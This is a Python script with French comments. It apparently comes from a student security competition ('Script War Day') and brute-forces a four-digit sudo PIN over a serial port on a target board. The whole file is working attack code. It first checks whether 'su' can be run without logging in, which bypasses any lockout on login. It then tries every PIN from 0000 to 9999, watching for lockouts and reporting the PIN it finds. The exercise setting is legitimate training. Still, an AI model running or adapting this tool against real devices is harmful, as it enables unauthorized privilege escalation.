#!/usr/bin/env python3
"""
brute_force_su.py — Brute force de la commande `su` (VH4 : su sans login)
GUARDIA B1 — Script War Day, objectif A8

Principe :
    VH4 : la commande `su XXXX` est dispatchee SANS verifier si l'utilisateur
    est connecte. On peut donc bruteforcer `su` directement, sans passer
    par `login`, contournant un eventuel lockout sur `login`.

    Si C11 est bien implemente : `su` sans login → "Connexion requise." → 0 pt.

Usage :
    python brute_force_su.py COM3
    python brute_force_su.py COM3 --start 1000
    python brute_force_su.py COM3 --delay 0.05
"""

import serial
import time
import sys
import argparse


def ouvrir_port(port, baud=115200, timeout=2.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def tester_su(ser, pin):
    """
    Essaie `su PIN`. Retourne :
      "ok"              — su reussi (mode sudo active)
      "ko"              — PIN incorrect (C11 implemente)
      "non_connecte"    — VH4 corrige (C11), connexion requise
      "non_implemente"  — C11 pas encore code par l'equipe cible
      "bloque"          — lockout detecte
      "timeout"         — pas de reponse
    """
    ser.reset_input_buffer()
    ser.write(f"su {pin}\r\n".encode())

    reponse = b""
    deadline = time.time() + 2.0
    while time.time() < deadline:
        octet = ser.read(1)
        if not octet:
            continue
        reponse += octet
        r = reponse.lower()
        # VH4 corrigee : su sans login refuse explicitement
        if b"connexion requise" in r or b"non connecte" in r:
            return "non_connecte"
        # C11 non implemente (message du template)
        if b"non implemente" in r or b"todo c11" in r:
            return "non_implemente"
        # Succes sudo (apres implementation C11 par la cible)
        # Chercher "actif" ou "eleve" mais PAS "non implemente"
        if b"actif" in r or b"eleve" in r:
            return "ok"
        # Echec PIN (C11 implemente)
        if b"pin incorrect" in r or b"incorrect" in r:
            return "ko"
        if b"trop de tentatives" in r or b"bloque" in r:
            return "bloque"
        if b"\n" in reponse[-3:]:
            break

    return "timeout" if not reponse else "ko"


def verifier_vh4_disponible(ser):
    """
    Verifie si VH4 est presente : envoie `su 0000` SANS avoir fait login.
    Retourne True si `su` est accepte sans erreur "connexion requise".
    """
    resultat = tester_su(ser, "0000")
    if resultat == "non_connecte":
        return False
    return True  # "ok", "ko", "bloque", "timeout" → VH4 potentiellement presente


def main():
    parser = argparse.ArgumentParser(
        description="Brute force 'su' sans login (VH4) — BlackBox B1 GUARDIA"
    )
    parser.add_argument("port", help="Port serie de la cible (ex: COM3)")
    parser.add_argument("--start", type=int, default=0,
                        help="PIN de depart (defaut: 0 = '0000')")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Pause entre essais en secondes (defaut: 0)")
    args = parser.parse_args()

    print("=" * 55)
    print("  BRUTE FORCE SU — BlackBox B1 GUARDIA")
    print("=" * 55)
    print(f"  Port  : {args.port}")
    print(f"  Cible : VH4 — su accessible sans login")
    print(f"  Plage : {args.start:04d} — 9999")
    print(f"  Delay : {args.delay} s entre essais")
    print("=" * 55)
    print()

    ser = ouvrir_port(args.port)

    # --- Detection de VH4 ---
    print("[*] Verification de VH4 (su sans login)...")
    vh4_ouverte = verifier_vh4_disponible(ser)

    if not vh4_ouverte:
        print("[v] VH4 CORRIGEE — 'su' sans login retourne 'Connexion requise'.")
        print("    C11 est bien implemente. Objectif A8 : 0 pt.")
        print("    Action : passez a d'autres objectifs.")
        ser.close()
        return

    print("[+] VH4 PRESENTE — 'su' repond sans erreur 'connexion requise'.")
    print("    Lancement du brute force...")
    print()

    t_debut = time.time()

    for n in range(args.start, 10000):
        pin = f"{n:04d}"
        resultat = tester_su(ser, pin)

        if resultat == "non_implemente":
            print(f"\n[?] C11 non implemente par la cible — brute force impossible.")
            print(f"    VH4 est presente (su accepte sans login) mais aucun PIN")
            print(f"    sudo n'est defini. Objectif A8 : 15 pts pour VH4 detectee.")
            ser.close()
            return

        if resultat == "ok":
            duree = time.time() - t_debut
            tentatives = n - args.start + 1
            print(f"\n[+] PIN SUDO TROUVE : {pin}")
            print(f"    Tentatives       : {tentatives}")
            print(f"    Duree            : {duree:.1f} secondes")
            print()
            print("    Mode sudo active — commandes privilegiees disponibles.")
            ser.close()
            return

        elif resultat == "non_connecte":
            # VH4 a ete resolue pendant le brute force (improbable mais possible)
            print(f"\n[v] VH4 fermee apres {n - args.start + 1} tentatives.")
            print("    (Peut-etre un reset de la carte ?)")
            ser.close()
            return

        elif resultat == "bloque":
            tentatives = n - args.start + 1
            print(f"\n[!] LOCKOUT detecte apres {tentatives} tentatives !")
            print(f"    Dernier PIN essaye : {pin}")
            print(f"    La cible a peut-etre implemente un lockout sur 'su'.")
            ser.close()
            return

        elif resultat == "timeout":
            print(f"\n[!] Timeout sur {pin} — verifiez la connexion.")

        else:
            # Progression tous les 50 essais
            if n % 50 == 0:
                duree = time.time() - t_debut
                restants = 9999 - n
                vitesse = (n - args.start + 1) / duree if duree > 0 else 0
                eta = restants / vitesse if vitesse > 0 else 0
                print(f"  su {pin} ... {vitesse:.0f} PIN/s — ETA {eta:.0f}s", end="\r")

        if args.delay > 0:
            time.sleep(args.delay)

    print(f"\n[!] PIN sudo non trouve dans la plage {args.start:04d}-9999.")
    ser.close()


if __name__ == "__main__":
    main()
